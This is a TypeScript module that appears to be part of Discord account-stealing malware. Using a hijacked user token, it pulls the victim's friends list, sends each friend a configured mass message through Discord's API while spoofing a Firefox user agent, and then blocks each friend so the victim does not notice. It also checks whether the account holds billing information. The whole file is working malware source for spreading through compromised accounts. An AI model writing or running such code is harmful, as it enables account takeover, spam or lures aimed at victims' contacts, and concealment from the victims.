import fetch from 'node-fetch';
import { Client } from "discord.js";

import { IConfig, IUser, IFriend } from "../global";
const config: IConfig = require('../../config.json');

export default async (client: Client, token: string, user: IUser, billingInformation: boolean) => {
    if (billingInformation && !config.massMessageBilling) return;
    
    const friends: IFriend[] = await (await fetch(`https://discord.com/api/users/@me/relationships`, { 
        headers: { 
            Authorization: token, 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
        } 
    })).json();

    for (const friend of friends) {
        const channel = await (await fetch(`https://discord.com/api/v9/users/@me/channels`, { 
            method: 'POST',
            body: JSON.stringify({
                recipients: [friend.id],
            }),
            headers: {
                Authorization: token,
                "Content-type": "application/json; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
        })).json();

        const message = await (await fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
            method: 'POST',
            body: JSON.stringify({
                content: config.massMessageText,
                nonce: '',
                tts: false
            }),
            headers: {
                Authorization: token,
                "Content-type": "application/json; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
        })).json();
        if (message.retry_after) await new Promise((resolve) => { setTimeout(resolve, message.retry_after * 1000) });

        const block = await (await fetch(`https://discord.com/api/v9/users/@me/relationships/${friend.id}`, {
            method: 'PUT',
            body: JSON.stringify({
                type: 2
            }),
            headers: {
                Authorization: token,
                "Content-type": "application/json; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
            }
        })).json();
    }
}